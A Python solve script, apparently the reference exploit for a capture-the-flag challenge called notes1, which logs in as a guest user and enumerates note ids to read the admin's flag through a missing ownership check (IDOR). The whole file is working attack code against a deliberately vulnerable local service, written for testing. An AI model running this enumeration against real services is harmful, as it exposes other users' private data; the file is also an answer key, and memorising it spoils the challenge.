#!/usr/bin/env python3
"""Reference exploit for notes1 (formerly idor-notes).

Log in as the low-priv `guest` user, then iterate note ids. The /note/<id>
endpoint never checks ownership, so the admin's note (and its flag) is readable.

    python solve.py                 # localhost:8020
    python solve.py http://host:8020
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8020")


def main() -> int:
    s = requests.Session()

    # The service may still be warming up under gunicorn.
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)

    r = s.post(f"{BASE}/login", data={"user": "guest", "pw": "guest123"},
               timeout=5)
    if r.status_code not in (200, 302):
        sys.stderr.write(f"login failed: {r.status_code}\n")
        return 1

    # Walk note ids; the bug means we can read notes we do not own.
    for note_id in range(1, 50):
        r = s.get(f"{BASE}/note/{note_id}", timeout=5)
        m = re.search(r"flag\{[^}]+\}", r.text)
        if m:
            print(m.group(0))
            return 0

    sys.stderr.write("no flag found in notes 1..49\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
